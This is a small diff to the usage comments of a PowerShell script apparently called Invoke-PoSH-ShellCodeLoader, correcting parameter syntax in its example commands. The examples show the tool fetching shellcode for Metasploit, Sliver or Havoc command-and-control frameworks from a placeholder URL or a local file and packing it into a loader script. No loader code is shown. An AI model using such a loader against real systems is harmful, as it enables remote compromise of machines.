@@ -13,8 +13,8 @@
 # ================================================================================================================================================
 # Usage:
 # > Import-Module ./Invoke-PoSH-ShellCodeLoader.ps1
-# > Invoke-PoSH-ShellCodeLoader -Type=MSF/Sliver/Havoc -FileUrl https://URL/shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1
-# > Invoke-PoSH-ShellCodeLoader -Type=MSF/Sliver/Havoc -FilePath C:\path\shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1
+# > Invoke-PoSH-ShellCodeLoader -Type MSF/Sliver/Havoc -FileUrl https://URL/shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1
+# > Invoke-PoSH-ShellCodeLoader -Type MSF/Sliver/Havoc -FilePath C:\path\shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1
 # ================================================================================================================================================
 # Input: 
 # ------
